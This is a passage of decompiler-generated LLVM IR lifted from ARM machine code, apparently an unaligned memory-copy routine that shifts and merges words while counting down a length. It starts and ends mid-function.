  br i1 %v5_1a960, label %dec_label_pc_1a97c, label %dec_label_pc_1a964

dec_label_pc_1a964:                               ; preds = %dec_label_pc_1a958, %dec_label_pc_1a918, %dec_label_pc_1a964
  %v1_1a970 = phi i32 [ %v4_1a970, %dec_label_pc_1a964 ], [ %v12_1a94c, %dec_label_pc_1a958 ], [ %v0_1a94c75, %dec_label_pc_1a918 ]
  %v0_1a964 = load i32, i32* @lr, align 4
  %v3_1a964 = mul i32 %v0_1a964, 256
  store i32 %v3_1a964, i32* %ip.global-to-local, align 4
  %v0_1a968 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a968 = inttoptr i32 %v0_1a968 to i32*
  %v2_1a968 = load i32, i32* %v1_1a968, align 4
  store i32 %v2_1a968, i32* @lr, align 4
  %v4_1a968 = add i32 %v0_1a968, 4
  store i32 %v4_1a968, i32* %r1.global-to-local, align 4
  %v4_1a96c = udiv i32 %v2_1a968, 16777216
  %v5_1a96c = or i32 %v4_1a96c, %v3_1a964
  store i32 %v5_1a96c, i32* @ip, align 4
  %v2_1a970 = inttoptr i32 %v1_1a970 to i32*
  store i32 %v5_1a96c, i32* %v2_1a970, align 4
  %v3_1a970 = load i32, i32* %r0.global-to-local, align 4
  %v4_1a970 = add i32 %v3_1a970, 4
  store i32 %v4_1a970, i32* %r0.global-to-local, align 4
  %v0_1a974 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a974 = add i32 %v0_1a974, -4
  store i32 %v2_1a974, i32* %r2.global-to-local, align 4
  %v6_1a978 = icmp slt i32 %v0_1a974, 4
  br i1 %v6_1a978, label %dec_label_pc_1a97c.loopexit, label %dec_label_pc_1a964

dec_label_pc_1a97c.loopexit:                      ; preds = %dec_label_pc_1a964
  %v4_1a974 = sub i32 3, %v0_1a974
  %v5_1a974 = and i32 %v4_1a974, %v0_1a974
  %v6_1a974 = icmp slt i32 %v5_1a974, 0
  %v7_1a974 = icmp slt i32 %v2_1a974, 0
  store i1 %v6_1a974, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1a974, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1a97c

dec_label_pc_1a97c:                               ; preds = %dec_label_pc_1a97c.loopexit, %dec_label_pc_1a958
  %v2_1a8bc112 = phi i32 [ %v4_1a970, %dec_label_pc_1a97c.loopexit ], [ %v12_1a94c, %dec_label_pc_1a958 ]
  %v0_1a8ac108 = phi i32 [ %v2_1a974, %dec_label_pc_1a97c.loopexit ], [ %v2_1a95c, %dec_label_pc_1a958 ]
  %v0_1a97c = load i32, i32* %r1.global-to-local, align 4
  %v1_1a97c = add i32 %v0_1a97c, -3
  store i32 %v1_1a97c, i32* %r1.global-to-local, align 4
  br label %bb133

dec_label_pc_1a984:                               ; preds = %dec_label_pc_1a904
  br i1 %v5_1a9f4, label %dec_label_pc_1a9d0, label %dec_label_pc_1a98c

dec_label_pc_1a98c:                               ; preds = %dec_label_pc_1a984
  store i32 %v2_1a9f0, i32* %r2.global-to-local, align 4
  %v3_1a990 = load i32, i32* @r4, align 4
  store i32 %v3_1a990, i32* %stack_var_-16, align 4
  %v6_1a990 = load i32, i32* @r5, align 4
  store i32 %v6_1a990, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1a994

dec_label_pc_1a994:                               ; preds = %dec_label_pc_1a994.dec_label_pc_1a994_crit_edge, %dec_label_pc_1a98c
  %v0_1a9b8 = phi i32 [ %v12_1a9b8, %dec_label_pc_1a994.dec_label_pc_1a994_crit_edge ], [ %v0_1a94c75, %dec_label_pc_1a98c ]
  %v0_1a998 = phi i32 [ %v0_1a998.pre, %dec_label_pc_1a994.dec_label_pc_1a994_crit_edge ], [ %v4_1a908, %dec_label_pc_1a98c ]
  %v0_1a994 = phi i32 [ %v0_1a994.pre, %dec_label_pc_1a994.dec_label_pc_1a994_crit_edge ], [ %v2_1a908, %dec_label_pc_1a98c ]
  %v3_1a994 = mul i32 %v0_1a994, 65536
  %v1_1a998 = inttoptr i32 %v0_1a998 to i32*
  %v2_1a998 = load i32, i32* %v1_1a998, align 4
  store i32 %v2_1a998, i32* %r4.global-to-local, align 4
  %v3_1a998 = add i32 %v0_1a998, 4
  %v4_1a998 = inttoptr i32 %v3_1a998 to i32*
  %v5_1a998 = load i32, i32* %v4_1a998, align 4
  store i32 %v5_1a998, i32* %r5.global-to-local, align 4
  %v6_1a998 = add i32 %v0_1a998, 8
  %v7_1a998 = inttoptr i32 %v6_1a998 to i32*
  %v8_1a998 = load i32, i32* %v7_1a998, align 4
  store i32 %v8_1a998, i32* %ip.global-to-local, align 4
  %v9_1a998 = add i32 %v0_1a998, 12
  %v10_1a998 = inttoptr i32 %v9_1a998 to i32*
  %v11_1a998 = load i32, i32* %v10_1a998, align 4
  store i32 %v11_1a998, i32* @lr, align 4
  %v12_1a998 = add i32 %v0_1a998, 16
  store i32 %v12_1a998, i32* %r1.global-to-local, align 4
  %v4_1a99c = udiv i32 %v2_1a998, 65536
  %v5_1a99c = or i32 %v4_1a99c, %v3_1a994
  store i32 %v5_1a99c, i32* @r3, align 4
  %v3_1a9a0 = mul i32 %v2_1a998, 65536
  %v4_1a9a4 = udiv i32 %v5_1a998, 65536
  %v5_1a9a4 = or i32 %v4_1a9a4, %v3_1a9a0
  store i32 %v5_1a9a4, i32* %r4.global-to-local, align 4
  %v3_1a9a8 = mul i32 %v5_1a998, 65536
  %v4_1a9ac = udiv i32 %v8_1a998, 65536
  %v5_1a9ac = or i32 %v4_1a9ac, %v3_1a9a8
  store i32 %v5_1a9ac, i32* %r5.global-to-local, align 4
  %v3_1a9b0 = mul i32 %v8_1a998, 65536
  %v4_1a9b4 = udiv i32 %v11_1a998, 65536
  %v5_1a9b4 = or i32 %v4_1a9b4, %v3_1a9b0
  store i32 %v5_1a9b4, i32* @ip, align 4
  %v1_1a9b8 = inttoptr i32 %v0_1a9b8 to i32*
  store i32 %v5_1a99c, i32* %v1_1a9b8, align 4
  %v3_1a9b8 = add i32 %v0_1a9b8, 4
  %v4_1a9b8 = inttoptr i32 %v3_1a9b8 to i32*
  %v5_1a9b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1a9b8, i32* %v4_1a9b8, align 4
  %v6_1a9b8 = add i32 %v0_1a9b8, 8
  %v7_1a9b8 = inttoptr i32 %v6_1a9b8 to i32*
  %v8_1a9b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1a9b8, i32* %v7_1a9b8, align 4
  %v9_1a9b8 = add i32 %v0_1a9b8, 12
  %v10_1a9b8 = inttoptr i32 %v9_1a9b8 to i32*
  %v11_1a9b8 = load i32, i32* @ip, align 4
  store i32 %v11_1a9b8, i32* %v10_1a9b8, align 4
  %v12_1a9b8 = add i32 %v0_1a9b8, 16
  store i32 %v12_1a9b8, i32* %r0.global-to-local, align 4
  %v0_1a9bc = load i32, i32* %r2.global-to-local, align 4
  %v2_1a9bc = add i32 %v0_1a9bc, -16
  store i32 %v2_1a9bc, i32* %r2.global-to-local, align 4
  %v6_1a9c0 = icmp slt i32 %v0_1a9bc, 16
  br i1 %v6_1a9c0, label %dec_label_pc_1a9c4, label %dec_label_pc_1a994.dec_label_pc_1a994_crit_edge

dec_label_pc_1a994.dec_label_pc_1a994_crit_edge:  ; preds = %dec_label_pc_1a994
  %v0_1a994.pre = load i32, i32* @lr, align 4
  %v0_1a998.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a994

dec_label_pc_1a9c4:                               ; preds = %dec_label_pc_1a994
  %v2_1a9c4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a9c4, i32* @r4, align 4
  %v5_1a9c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1a9c4, i32* @r5, align 4
  %v2_1a9c8 = add i32 %v0_1a9bc, -4
  store i32 %v2_1a9c8, i32* %r2.global-to-local, align 4
  %v4_1a9c8 = add i32 %v0_1a9bc, 2147483632
  %v5_1a9c8 = and i32 %v2_1a9c8, %v4_1a9c8
  %v6_1a9c8 = icmp slt i32 %v5_1a9c8, 0
  store i1 %v6_1a9c8, i1* %cpsr_v.global-to-local, align 1
  %v7_1a9c8 = icmp slt i32 %v2_1a9c8, 0
  store i1 %v7_1a9c8, i1* %cpsr_n.global-to-local, align 1
  %v5_1a9cc = icmp slt i32 %v2_1a9bc, -12
  br i1 %v5_1a9cc, label %dec_label_pc_1a9e8, label %dec_label_pc_1a9d0

dec_label_pc_1a9d0:                               ; preds = %dec_label_pc_1a9c4, %dec_label_pc_1a984, %dec_label_pc_1a9d0
  %v1_1a9dc = phi i32 [ %v4_1a9dc, %dec_label_pc_1a9d0 ], [ %v12_1a9b8, %dec_label_pc_1a9c4 ], [ %v0_1a94c75, %dec_label_pc_1a984 ]
  %v0_1a9d0 = load i32, i32* @lr, align 4
  %v3_1a9d0 = mul i32 %v0_1a9d0, 65536
  store i32 %v3_1a9d0, i32* %ip.global-to-local, align 4
  %v0_1a9d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a9d4 = inttoptr i32 %v0_1a9d4 to i32*
  %v2_1a9d4 = load i32, i32* %v1_1a9d4, align 4
  store i32 %v2_1a9d4, i32* @lr, align 4
  %v4_1a9d4 = add i32 %v0_1a9d4, 4
  store i32 %v4_1a9d4, i32* %r1.global-to-local, align 4
  %v4_1a9d8 = udiv i32 %v2_1a9d4, 65536
  %v5_1a9d8 = or i32 %v4_1a9d8, %v3_1a9d0
  store i32 %v5_1a9d8, i32* @ip, align 4
  %v2_1a9dc = inttoptr i32 %v1_1a9dc to i32*
  store i32 %v5_1a9d8, i32* %v2_1a9dc, align 4
  %v3_1a9dc = load i32, i32* %r0.global-to-local, align 4
  %v4_1a9dc = add i32 %v3_1a9dc, 4
  store i32 %v4_1a9dc, i32* %r0.global-to-local, align 4
  %v0_1a9e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a9e0 = add i32 %v0_1a9e0, -4
  store i32 %v2_1a9e0, i32* %r2.global-to-local, align 4
  %v6_1a9e4 = icmp slt i32 %v0_1a9e0, 4
  br i1 %v6_1a9e4, label %dec_label_pc_1a9e8.loopexit, label %dec_label_pc_1a9d0

dec_label_pc_1a9e8.loopexit:                      ; preds = %dec_label_pc_1a9d0
  %v4_1a9e0 = sub i32 3, %v0_1a9e0
  %v5_1a9e0 = and i32 %v4_1a9e0, %v0_1a9e0
  %v6_1a9e0 = icmp slt i32 %v5_1a9e0, 0
  %v7_1a9e0 = icmp slt i32 %v2_1a9e0, 0
  store i1 %v6_1a9e0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1a9e0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1a9e8

dec_label_pc_1a9e8:                               ; preds = %dec_label_pc_1a9e8.loopexit, %dec_label_pc_1a9c4
  %v2_1a8bc113 = phi i32 [ %v4_1a9dc, %dec_label_pc_1a9e8.loopexit ], [ %v12_1a9b8, %dec_label_pc_1a9c4 ]
  %v0_1a8ac109 = phi i32 [ %v2_1a9e0, %dec_label_pc_1a9e8.loopexit ], [ %v2_1a9c8, %dec_label_pc_1a9c4 ]
  %v0_1a9e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a9e8 = add i32 %v0_1a9e8, -2
  store i32 %v1_1a9e8, i32* %r1.global-to-local, align 4
  br label %bb133

dec_label_pc_1a9f0:                               ; preds = %dec_label_pc_1a904
  br i1 %v5_1a9f4, label %dec_label_pc_1aa3c, label %dec_label_pc_1a9f8

dec_label_pc_1a9f8:                               ; preds = %dec_label_pc_1a9f0
  store i32 %v2_1a9f0, i32* %r2.global-to-local, align 4
  %v3_1a9fc = load i32, i32* @r4, align 4
  store i32 %v3_1a9fc, i32* %stack_var_-16, align 4
  %v6_1a9fc = load i32, i32* @r5, align 4
  store i32 %v6_1a9fc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1aa00

dec_label_pc_1aa00:                               ; preds = %dec_label_pc_1aa00.dec_label_pc_1aa00_crit_edge, %dec_label_pc_1a9f8
  %v0_1aa24 = phi i32 [ %v12_1aa24, %dec_label_pc_1aa00.dec_label_pc_1aa00_crit_edge ], [ %v0_1a94c75, %dec_label_pc_1a9f8 ]
  %v0_1aa04 = phi i32 [ %v0_1aa04.pre, %dec_label_pc_1aa00.dec_label_pc_1aa00_crit_edge ], [ %v4_1a908, %dec_label_pc_1a9f8 ]
  %v0_1aa00 = phi i32 [ %v0_1aa00.pre, %dec_label_pc_1aa00.dec_label_pc_1aa00_crit_edge ], [ %v2_1a908, %dec_label_pc_1a9f8 ]
  %v3_1aa00 = mul i32 %v0_1aa00, 16777216
  %v1_1aa04 = inttoptr i32 %v0_1aa04 to i32*
  %v2_1aa04 = load i32, i32* %v1_1aa04, align 4
  store i32 %v2_1aa04, i32* %r4.global-to-local, align 4
  %v3_1aa04 = add i32 %v0_1aa04, 4
  %v4_1aa04 = inttoptr i32 %v3_1aa04 to i32*
  %v5_1aa04 = load i32, i32* %v4_1aa04, align 4
  store i32 %v5_1aa04, i32* %r5.global-to-local, align 4
  %v6_1aa04 = add i32 %v0_1aa04, 8
  %v7_1aa04 = inttoptr i32 %v6_1aa04 to i32*
  %v8_1aa04 = load i32, i32* %v7_1aa04, align 4
  store i32 %v8_1aa04, i32* %ip.global-to-local, align 4
  %v9_1aa04 = add i32 %v0_1aa04, 12
  %v10_1aa04 = inttoptr i32 %v9_1aa04 to i32*
  %v11_1aa04 = load i32, i32* %v10_1aa04, align 4
  store i32 %v11_1aa04, i32* @lr, align 4
  %v12_1aa04 = add i32 %v0_1aa04, 16
  store i32 %v12_1aa04, i32* %r1.global-to-local, align 4
  %v4_1aa08 = udiv i32 %v2_1aa04, 256
  %v5_1aa08 = or i32 %v4_1aa08, %v3_1aa00
  store i32 %v5_1aa08, i32* @r3, align 4
  %v3_1aa0c = mul i32 %v2_1aa04, 16777216
  %v4_1aa10 = udiv i32 %v5_1aa04, 256
  %v5_1aa10 = or i32 %v4_1aa10, %v3_1aa0c
  store i32 %v5_1aa10, i32* %r4.global-to-local, align 4
  %v3_1aa14 = mul i32 %v5_1aa04, 16777216
  %v4_1aa18 = udiv i32 %v8_1aa04, 256
  %v5_1aa18 = or i32 %v4_1aa18, %v3_1aa14
  store i32 %v5_1aa18, i32* %r5.global-to-local, align 4
  %v3_1aa1c = mul i32 %v8_1aa04, 16777216
  %v4_1aa20 = udiv i32 %v11_1aa04, 256
  %v5_1aa20 = or i32 %v4_1aa20, %v3_1aa1c
  store i32 %v5_1aa20, i32* @ip, align 4
  %v1_1aa24 = inttoptr i32 %v0_1aa24 to i32*
  store i32 %v5_1aa08, i32* %v1_1aa24, align 4
  %v3_1aa24 = add i32 %v0_1aa24, 4
  %v4_1aa24 = inttoptr i32 %v3_1aa24 to i32*
  %v5_1aa24 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1aa24, i32* %v4_1aa24, align 4
  %v6_1aa24 = add i32 %v0_1aa24, 8
  %v7_1aa24 = inttoptr i32 %v6_1aa24 to i32*
  %v8_1aa24 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1aa24, i32* %v7_1aa24, align 4
  %v9_1aa24 = add i32 %v0_1aa24, 12
  %v10_1aa24 = inttoptr i32 %v9_1aa24 to i32*
  %v11_1aa24 = load i32, i32* @ip, align 4
  store i32 %v11_1aa24, i32* %v10_1aa24, align 4
  %v12_1aa24 = add i32 %v0_1aa24, 16
  store i32 %v12_1aa24, i32* %r0.global-to-local, align 4
  %v0_1aa28 = load i32, i32* %r2.global-to-local, align 4
  %v2_1aa28 = add i32 %v0_1aa28, -16
  store i32 %v2_1aa28, i32* %r2.global-to-local, align 4
  %v6_1aa2c = icmp slt i32 %v0_1aa28, 16
  br i1 %v6_1aa2c, label %dec_label_pc_1aa30, label %dec_label_pc_1aa00.dec_label_pc_1aa00_crit_edge

dec_label_pc_1aa00.dec_label_pc_1aa00_crit_edge:  ; preds = %dec_label_pc_1aa00
  %v0_1aa00.pre = load i32, i32* @lr, align 4
  %v0_1aa04.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1aa00

dec_label_pc_1aa30:                               ; preds = %dec_label_pc_1aa00
  %v2_1aa30 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1aa30, i32* @r4, align 4
  %v5_1aa30 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1aa30, i32* @r5, align 4
  %v2_1aa34 = add i32 %v0_1aa28, -4
  store i32 %v2_1aa34, i32* %r2.global-to-local, align 4
  %v4_1aa34 = add i32 %v0_1aa28, 2147483632
  %v5_1aa34 = and i32 %v2_1aa34, %v4_1aa34
  %v6_1aa34 = icmp slt i32 %v5_1aa34, 0
  store i1 %v6_1aa34, i1* %cpsr_v.global-to-local, align 1
  %v7_1aa34 = icmp slt i32 %v2_1aa34, 0
  store i1 %v7_1aa34, i1* %cpsr_n.global-to-local, align 1
  %v5_1aa38 = icmp slt i32 %v2_1aa28, -12
  br i1 %v5_1aa38, label %dec_label_pc_1aa54, label %dec_label_pc_1aa3c

dec_label_pc_1aa3c:                               ; preds = %dec_label_pc_1aa30, %dec_label_pc_1a9f0, %dec_label_pc_1aa3c
  %v1_1aa48 = phi i32 [ %v4_1aa48, %dec_label_pc_1aa3c ], [ %v12_1aa24, %dec_label_pc_1aa30 ], [ %v0_1a94c75, %dec_label_pc_1a9f0 ]
  %v0_1aa3c = load i32, i32* @lr, align 4
  %v3_1aa3c = mul i32 %v0_1aa3c, 16777216
  store i32 %v3_1aa3c, i32* %ip.global-to-local, align 4
  %v0_1aa40 = load i32, i32* %r1.global-to-local, align 4
  %v1_1aa40 = inttoptr i32 %v0_1aa40 to i32*
  %v2_1aa40 = load i32, i32* %v1_1aa40, align 4
  store i32 %v2_1aa40, i32* @lr, align 4
  %v4_1aa40 = add i32 %v0_1aa40, 4
  store i32 %v4_1aa40, i32* %r1.global-to-local, align 4
  %v4_1aa44 = udiv i32 %v2_1aa40, 256
  %v5_1aa44 = or i32 %v4_1aa44, %v3_1aa3c
  store i32 %v5_1aa44, i32* @ip, align 4
  %v2_1aa48 = inttoptr i32 %v1_1aa48 to i32*
  store i32 %v5_1aa44, i32* %v2_1aa48, align 4
  %v3_1aa48 = load i32, i32* %r0.global-to-local, align 4
  %v4_1aa48 = add i32 %v3_1aa48, 4
  store i32 %v4_1aa48, i32* %r0.global-to-local, align 4
  %v0_1aa4c = load i32, i32* %r2.global-to-local, align 4
  %v2_1aa4c = add i32 %v0_1aa4c, -4
  store i32 %v2_1aa4c, i32* %r2.global-to-local, align 4
  %v6_1aa50 = icmp slt i32 %v0_1aa4c, 4
  br i1 %v6_1aa50, label %dec_label_pc_1aa54.loopexit, label %dec_label_pc_1aa3c

dec_label_pc_1aa54.loopexit:                      ; preds = %dec_label_pc_1aa3c
  %v4_1aa4c = sub i32 3, %v0_1aa4c
  %v5_1aa4c = and i32 %v4_1aa4c, %v0_1aa4c
  %v6_1aa4c = icmp slt i32 %v5_1aa4c, 0
  %v7_1aa4c = icmp slt i32 %v2_1aa4c, 0
  store i1 %v6_1aa4c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1aa4c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1aa54

dec_label_pc_1aa54:                               ; preds = %dec_label_pc_1aa54.loopexit, %dec_label_pc_1aa30
  %v2_1a8bc114 = phi i32 [ %v4_1aa48, %dec_label_pc_1aa54.loopexit ], [ %v12_1aa24, %dec_label_pc_1aa30 ]
  %v0_1a8ac110 = phi i32 [ %v2_1aa4c, %dec_label_pc_1aa54.loopexit ], [ %v2_1aa34, %dec_label_pc_1aa30 ]
  %v0_1aa54 = load i32, i32* %r1.global-to-local, align 4
  %v1_1aa54 = add i32 %v0_1aa54, -1
  store i32 %v1_1aa54, i32* %r1.global-to-local, align 4
  br label %bb133

dec_label_pc_1aa5c:                               ; preds = %entry
  %v1_1aa5c = load i32, i32* @r2, align 4
  %v2_1aa5c = add i32 %v1_1aa5c, %v0_1a810
  store i32 %v2_1aa5c, i32* %r1.global-to-local, align 4
  %v2_1aa60 = add i32 %v1_1aa5c, %v1_1a810
  store i32 %v2_1aa60, i32* %r0.global-to-local, align 4
  %v2_1aa64 = add i32 %v1_1aa5c, -4
  store i32 %v2_1aa64, i32* %r2.global-to-local, align 4
  %v4_1aa64 = sub i32 3, %v1_1aa5c
  %v5_1aa64 = and i32 %v4_1aa64, %v1_1aa5c
  %v6_1aa64 = icmp slt i32 %v5_1aa64, 0
  store i1 %v6_1aa64, i1* %cpsr_v.global-to-local, align 1
  %v7_1aa64 = icmp slt i32 %v2_1aa64, 0
  store i1 %v7_1aa64, i1* %cpsr_n.global-to-local, align 1
  %v5_1aa68 = icmp slt i32 %v1_1aa5c, 4
  br i1 %v5_1aa68, label %bb143, label %dec_label_pc_1aa6c

dec_label_pc_1aa6c:                               ; preds = %dec_label_pc_1aa5c
  %v1_1aa6c = urem i32 %v2_1aa60, 4
  store i32 %v1_1aa6c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1aa6c = icmp eq i32 %v1_1aa6c, 0
  br i1 %v2_1aa6c, label %dec_label_pc_1aa74, label %dec_label_pc_1ab14

dec_label_pc_1aa74:                               ; preds = %dec_label_pc_1aa6c
  %v1_1aa74 = urem i32 %v2_1aa5c, 4
  store i32 %v1_1aa74, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1aa74 = icmp eq i32 %v1_1aa74, 0
  br i1 %v2_1aa74, label %dec_label_pc_1aa7c, label %dec_label_pc_1ab40

dec_label_pc_1aa7c:                               ; preds = %dec_label_pc_1aa74, %dec_label_pc_1ab38
  %v0_1aa9449 = phi i32 [ %v2_1aa60, %dec_label_pc_1aa74 ], [ %v0_1ab8832, %dec_label_pc_1ab38 ]
  %v0_1aa9048 = phi i32 [ %v2_1aa5c, %dec_label_pc_1aa74 ], [ %v0_1ab38, %dec_label_pc_1ab38 ]
  %v0_1aa7c = phi i32 [ %v2_1aa64, %dec_label_pc_1aa74 ], [ %v2_1ab30, %dec_label_pc_1ab38 ]
  %v2_1aa7c = add i32 %v0_1aa7c, -8
  store i32 %v2_1aa7c, i32* %r2.global-to-local, align 4
  %v4_1aa7c = sub i32 7, %v0_1aa7c
  %v5_1aa7c = and i32 %v4_1aa7c, %v0_1aa7c
  %v6_1aa7c = icmp slt i32 %v5_1aa7c, 0
  store i1 %v6_1aa7c, i1* %cpsr_v.global-to-local, align 1
  %v7_1aa7c = icmp slt i32 %v2_1aa7c, 0
  store i1 %v7_1aa7c, i1* %cpsr_n.global-to-local, align 1
  %v5_1aa80 = icmp slt i32 %v0_1aa7c, 8
  br i1 %v5_1aa80, label %dec_label_pc_1aacc, label %dec_label_pc_1aa84

dec_label_pc_1aa84:                               ; preds = %dec_label_pc_1aa7c
  %v3_1aa84 = load i32, i32* @r4, align 4
  %v5_1aa84 = inttoptr i32 %v3_1aa84 to i8*
  store i8* %v5_1aa84, i8** %stack_var_-8, align 4
  %v8_1aa84 = load i32, i32* @lr, align 4
  %v2_1aa88 = add i32 %v0_1aa7c, -28
  store i32 %v2_1aa88, i32* %r2.global-to-local, align 4
  %v4_1aa88 = sub i32 27, %v0_1aa7c
  %v5_1aa88 = and i32 %v4_1aa88, %v2_1aa7c
  %v6_1aa88 = icmp slt i32 %v5_1aa88, 0
  store i1 %v6_1aa88, i1* %cpsr_v.global-to-local, align 1
  %v7_1aa88 = icmp slt i32 %v2_1aa88, 0
  store i1 %v7_1aa88, i1* %cpsr_n.global-to-local, align 1
  %v5_1aa8c = icmp slt i32 %v2_1aa7c, 20
  br i1 %v5_1aa8c, label %dec_label_pc_1aaa8, label %dec_label_pc_1aa90

dec_label_pc_1aa90:                               ; preds = %dec_label_pc_1aa84, %dec_label_pc_1aa90.dec_label_pc_1aa90_crit_edge
  %v0_1aa94 = phi i32 [ %v1_1aa9c, %dec_label_pc_1aa90.dec_label_pc_1aa90_crit_edge ], [ %v0_1aa9449, %dec_label_pc_1aa84 ]
  %v0_1aa90 = phi i32 [ %v0_1aa90.pre, %dec_label_pc_1aa90.dec_label_pc_1aa90_crit_edge ], [ %v0_1aa9048, %dec_label_pc_1aa84 ]
  %v1_1aa90 = add i32 %v0_1aa90, -4
  %v2_1aa90 = inttoptr i32 %v1_1aa90 to i32*
  %v3_1aa90 = load i32, i32* %v2_1aa90, align 4
  %v4_1aa90 = add i32 %v0_1aa90, -8
  %v5_1aa90 = inttoptr i32 %v4_1aa90 to i32*
  %v6_1aa90 = load i32, i32* %v5_1aa90, align 4
  store i32 %v6_1aa90, i32* %r4.global-to-local, align 4
  %v7_1aa90 = add i32 %v0_1aa90, -12
  %v8_1aa90 = inttoptr i32 %v7_1aa90 to i32*
  %v9_1aa90 = load i32, i32* %v8_1aa90, align 4
  store i32 %v9_1aa90, i32* %ip.global-to-local, align 4
  %v10_1aa90 = add i32 %v0_1aa90, -16
  %v11_1aa90 = inttoptr i32 %v10_1aa90 to i32*
  %v12_1aa90 = load i32, i32* %v11_1aa90, align 4
  store i32 %v12_1aa90, i32* %lr.global-to-local, align 4
  store i32 %v10_1aa90, i32* %r1.global-to-local, align 4
  %v1_1aa94 = add i32 %v0_1aa94, -16
  %v2_1aa94 = inttoptr i32 %v1_1aa94 to i32*
  store i32 %v3_1aa90, i32* %v2_1aa94, align 4
  %v4_1aa94 = add i32 %v0_1aa94, -12
  %v5_1aa94 = inttoptr i32 %v4_1aa94 to i32*
  %v6_1aa94 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1aa94, i32* %v5_1aa94, align 4
  %v7_1aa94 = add i32 %v0_1aa94, -8
  %v8_1aa94 = inttoptr i32 %v7_1aa94 to i32*
  %v9_1aa94 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1aa94, i32* %v8_1aa94, align 4
  %v10_1aa94 = add i32 %v0_1aa94, -4
  %v11_1aa94 = inttoptr i32 %v10_1aa94 to i32*
  %v12_1aa94 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1aa94, i32* %v11_1aa94, align 4
  store i32 %v1_1aa94, i32* %r0.global-to-local, align 4
  %v0_1aa98 = load i32, i32* %r1.global-to-local, align 4
  %v1_1aa98 = add i32 %v0_1aa98, -4
  %v2_1aa98 = inttoptr i32 %v1_1aa98 to i32*
  %v3_1aa98 = load i32, i32* %v2_1aa98, align 4
  store i32 %v3_1aa98, i32* @r3, align 4
  %v4_1aa98 = add i32 %v0_1aa98, -8
  %v5_1aa98 = inttoptr i32 %v4_1aa98 to i32*
  %v6_1aa98 = load i32, i32* %v5_1aa98, align 4
  store i32 %v6_1aa98, i32* %r4.global-to-local, align 4
  %v7_1aa98 = add i32 %v0_1aa98, -12
  %v8_1aa98 = inttoptr i32 %v7_1aa98 to i32*
  %v9_1aa98 = load i32, i32* %v8_1aa98, align 4
  store i32 %v9_1aa98, i32* @ip, align 4
  %v10_1aa98 = add i32 %v0_1aa98, -16
  %v11_1aa98 = inttoptr i32 %v10_1aa98 to i32*
  %v12_1aa98 = load i32, i32* %v11_1aa98, align 4
  store i32 %v12_1aa98, i32* %lr.global-to-local, align 4
  store i32 %v10_1aa98, i32* %r1.global-to-local, align 4
  %v1_1aa9c = add i32 %v0_1aa94, -32
  %v2_1aa9c = inttoptr i32 %v1_1aa9c to i32*
  store i32 %v3_1aa98, i32* %v2_1aa9c, align 4
  %v4_1aa9c = add i32 %v0_1aa94, -28
  %v5_1aa9c = inttoptr i32 %v4_1aa9c to i32*
  %v6_1aa9c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1aa9c, i32* %v5_1aa9c, align 4
  %v7_1aa9c = add i32 %v0_1aa94, -24
  %v8_1aa9c = inttoptr i32 %v7_1aa9c to i32*
  %v9_1aa9c = load i32, i32* @ip, align 4
  store i32 %v9_1aa9c, i32* %v8_1aa9c, align 4
  %v10_1aa9c = add i32 %v0_1aa94, -20
  %v11_1aa9c = inttoptr i32 %v10_1aa9c to i32*
  %v12_1aa9c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1aa9c, i32* %v11_1aa9c, align 4
  store i32 %v1_1aa9c, i32* %r0.global-to-local, align 4
  %v0_1aaa0 = load i32, i32* %r2.global-to-local, align 4
  %v2_1aaa0 = add i32 %v0_1aaa0, -32
  store i32 %v2_1aaa0, i32* %r2.global-to-local, align 4
  %v6_1aaa4 = icmp slt i32 %v0_1aaa0, 32
  br i1 %v6_1aaa4, label %dec_label_pc_1aaa8.loopexit, label %dec_label_pc_1aa90.dec_label_pc_1aa90_crit_edge

dec_label_pc_1aa90.dec_label_pc_1aa90_crit_edge:  ; preds = %dec_label_pc_1aa90
  %v0_1aa90.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1aa90

dec_label_pc_1aaa8.loopexit:                      ; preds = %dec_label_pc_1aa90
  %v4_1aaa0 = sub i32 31, %v0_1aaa0
  %v5_1aaa0 = and i32 %v4_1aaa0, %v0_1aaa0
  %v6_1aaa0 = icmp slt i32 %v5_1aaa0, 0
  %v7_1aaa0 = icmp slt i32 %v2_1aaa0, 0
  store i1 %v6_1aaa0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1aaa0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1aaa8

dec_label_pc_1aaa8:                               ; preds = %dec_label_pc_1aaa8.loopexit, %dec_label_pc_1aa84
  %v6_1aab0 = phi i32 [ %v1_1aa9c, %dec_label_pc_1aaa8.loopexit ], [ %v0_1aa9449, %dec_label_pc_1aa84 ]
